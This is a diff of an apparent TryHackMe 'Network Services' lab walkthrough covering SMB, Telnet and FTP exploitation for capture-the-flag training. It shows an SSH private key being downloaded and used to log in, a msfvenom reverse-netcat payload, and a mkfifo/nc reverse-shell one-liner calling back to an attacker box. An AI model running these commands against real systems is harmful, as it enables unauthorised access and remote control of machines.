@@ -1,8 +1,11 @@
 # Network Services
++ Description: Learn about, then enumerate and exploit a variety of network services and misconfigurations.
 + Link: https://tryhackme.com/r/room/networkservices
-+ Target IP Address (SMB): 10.10.6.182 *Differs in some images.
++ Type: Walkthrough
+  
++ Target IP Address (SMB): 10.10.6.182
 + Target IP Address (Telnet): 10.10.112.119
-+ AttackBox IP Address (Telnet): 10.10.198.128 *Differs in some images.
++ AttackBox IP Address (Telnet): 10.10.198.128
 + Target IP Address (FTP): 10.10.148.36
 
 ## Tools
@@ -40,7 +43,7 @@ N/A
 2. Looked around in the directory. Found that a person named John Cactus uses/owns this folder, they connect using SSH, and their authorization keys.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/04.png)
   
-3. `get id_rsa` and `get id_rsa.pub` to download the files. `cat id_rsa.pub` to find a hint to John's login infomation "cactus@polosmb".  
+3. `get id_rsa` and `get id_rsa.pub` to download the files. `cat id_rsa.pub` to find a hint to John's login infomation "cactus@polosmb".
 4. `ssh -i id_rsa cactus@10.10.6.182` to log into the machine using John's RSA private key.
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/05.png)
   
@@ -69,9 +72,8 @@ N/A
 3. On the AttackBox `msfvenom -p cmd/unix/reverse_netcat lhost=10.10.198.128 lport=4444 R` to create the reverse shell.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/09.png)
   
-4. One the AttackBox`nc -lvp 4444` to listen on port 4444.
+4. On the AttackBox `nc -lvp 4444` to listen on port 4444.
 5. On the Telnet session `.RUN mkfifo /tmp/tmqkt; nc 10.10.198.128 4444 0</tmp/tmqkt | /bin/sh >/tmp/tmqkt 2>&1; rm /tmp/tmqkt`.
-  
 6. On the AttackBox in the Terminal with the listener, I executed `ls` and `cat flag.txt` to locate and display the flag.  
    ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room04/Screenshots/10.png)
   
@@ -107,7 +109,6 @@ N/A
 3. `get ftp.txt` and `cat ftp.txt` to see what's in the file. Found the flag.
 
 ## Task 11 | Expanding Your Knowledge
-+ https://www.ietf.org/rfc/rfc959.txt
 + https://medium.com/@gregIT/exploiting-simple-network-services-in-ctfs-ec8735be5eef
 + https://attack.mitre.org/techniques/T1210/
 + https://www.nextgov.com/cybersecurity/2019/10/nsa-warns-vulnerabilities-multiple-vpn-services/160456/
